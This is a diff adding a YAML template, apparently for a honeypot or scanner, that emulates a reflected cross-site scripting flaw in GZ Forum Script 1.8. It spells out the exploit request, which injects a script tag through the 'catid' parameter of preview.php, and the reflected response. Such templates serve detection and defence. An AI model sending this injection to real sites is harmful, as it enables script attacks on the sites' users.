@@ -1,0 +1,28 @@
+id: gz-forum-script-xss
+info:
+  name: GZ Forum Script 1.8 - Cross-Site Scripting
+  author: r3Y3r53
+  description: 'Cross-site scripting (XSS) is an attack in which an attacker injects
+    malicious executable scripts into the code of a trusted application or website.
+    Attackers often initiate an XSS attack by sending a malicious link to a user and
+    enticing the user to click it.
+
+    '
+  severity: medium
+  reference:
+  - https://www.exploit-db.com/exploits/51559
+  - https://gzscripts.com/gz-forum-script.html
+  metadata:
+    verified: true
+    max-request: 1
+  tags: gzforum,xss,unauth
+traps:
+- request:
+    method: GET
+    path: preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: '><script>alert(document.domain)</script>New Topic'
